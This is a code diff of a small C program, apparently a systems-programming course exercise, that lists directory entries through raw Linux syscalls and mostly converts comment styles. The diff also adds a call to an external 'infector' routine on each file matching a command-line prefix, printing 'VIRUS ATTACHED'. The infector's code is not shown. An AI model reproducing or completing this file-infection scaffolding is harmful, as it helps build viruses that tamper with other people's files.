@@ -8,6 +8,8 @@
 
 #define O_RDONLY 0
 
+extern void infector(char *filename);
+
 /* Linux kernel dirent structure for 32-bit systems */
 struct directory
 {
@@ -21,31 +23,31 @@ int main(int argc, char *argv[])
 {
     int i;
     char prefix = 0;
-    int has_prefix = 0; // indicator
+    int has_prefix = 0; /*indicator*/
     int fd;
     int numread;
     int bfpos = 0;
-    char buf[8192]; // buffer for getdents
+    char buf[8192]; /* buffer for getdents*/
 
-    // loop the arguments to find any prefix if it exists!!
+    /* loop the arguments to find any prefix if it exists!!*/
     for (i = 1; i < argc; i++)
     {
         if (argv[i][0] == '-' && argv[i][1] == 'a')
         {
-            prefix = argv[i][2]; // Get the 1-character prefix after "-a"
+            prefix = argv[i][2]; /* Get the 1-character prefix after "-a"*/
             has_prefix = 1;
         }
     }
 
-    // open current directory
-    // sys: what to do, where, how- flags, extra
-    // sys_open: eax=5, ebx=filename, ecx=flags, edx=mode
-    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0); // for reading only
+    /* open current directory
+     sys: what to do, where, how- flags, extra
+     sys_open: eax=5, ebx=filename, ecx=flags, edx=mode*/
+    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0); /* for reading only*/
     if (fd < 0)
-    { // error
+    { /* error*/
         system_call(SYS_EXIT, 0x55);
     }
-    // now read the files
+    /* now read the files*/
     numread = system_call(SYS_GETDENTS, fd, buf, 8192);
     if (numread <= 0)
     {
@@ -58,16 +60,23 @@ int main(int argc, char *argv[])
 
         if (!has_prefix || filename[0] == prefix)
         {
-            // print the filename using system call
-            // sys_write: eax=4, ebx=file, ecx=buffer, edx=count
+            /* print the filename using system call
+             sys_write: eax=4, ebx=file, ecx=buffer, edx=count*/
             system_call(SYS_WRITE, 1, filename, strlen(filename));
+
+            if (has_prefix)
+            {
+                infector(filename);
+                system_call(SYS_WRITE, 1, " VIRUS ATTACHED", 15);
+            }
+
             system_call(SYS_WRITE, 1, "\n", 1);
         }
 
         bfpos += d->length;
     }
 
-    // close the file
+    /* close the file*/
     system_call(SYS_CLOSE, fd);
     return 0;
 }
